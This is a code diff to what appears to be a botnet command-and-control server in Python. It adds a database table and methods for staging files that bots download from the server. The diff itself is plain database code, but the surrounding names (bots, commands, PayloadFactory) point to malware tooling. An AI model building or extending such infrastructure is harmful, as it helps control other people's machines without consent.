@@ -11,7 +11,7 @@ from textwrap import dedent
 from Cryptodome.Cipher import AES
 from Cryptodome.Random import get_random_bytes
 from Cryptodome.Hash import MD5
-from typing import Tuple, Optional
+from typing import Tuple, Optional, List
 
 
 class RequestType:
@@ -75,6 +75,7 @@ class Model:
         self._cursor.execute("DROP TABLE IF EXISTS commands")
         self._cursor.execute("DROP TABLE IF EXISTS global_command")
         self._cursor.execute("DROP TABLE IF EXISTS global_executed")
+        self._cursor.execute("DROP TABLE IF EXISTS upload_files")
 
         self._cursor.execute("CREATE TABLE bots("
                              "bot_uid text PRIMARY KEY, "
@@ -90,6 +91,9 @@ class Model:
                              "command text)")
         self._cursor.execute("CREATE TABLE global_executed("
                              "uid text)")
+        self._cursor.execute("CREATE TABLE upload_files("
+                             "url_path text, "
+                             "local_path text)")
 
         self._database.commit()
 
@@ -211,6 +215,32 @@ class Model:
             self._cursor.execute("DELETE FROM commands WHERE rowid = "
                                  "(SELECT rowid FROM commands WHERE bot_uid = ? LIMIT 1)", (bot_uid,))
             self._database.commit()
+
+    def add_upload_file(self, url_path: str, local_path: str):
+        """Adds a file which should be hosted by the server.
+
+        Automatically removed by the server once the bot downloads this file.
+        """
+        with self._lock:
+            self._cursor.execute("INSERT INTO upload_files VALUES (?,?)", (url_path, local_path))
+            self._database.commit()
+
+    def remove_upload_file(self, url_path: str):
+        """Remove the file from the list of files the server should host."""
+        with self._lock:
+            self._cursor.execute("DELETE FROM upload_files WHERE url_path = ?", (url_path,))
+            self._database.commit()
+
+    def get_upload_files(self) -> List[Tuple[str, str]]:
+        """:return: A tuple containing the URL path and local file path."""
+        with self._lock:
+            tuple_list = []
+            response = self._cursor.execute("SELECT * FROM upload_files").fetchall()
+
+            for row in response:
+                tuple_list.append((row[0], row[1]))
+
+            return tuple_list
 
 
 class PayloadFactory:
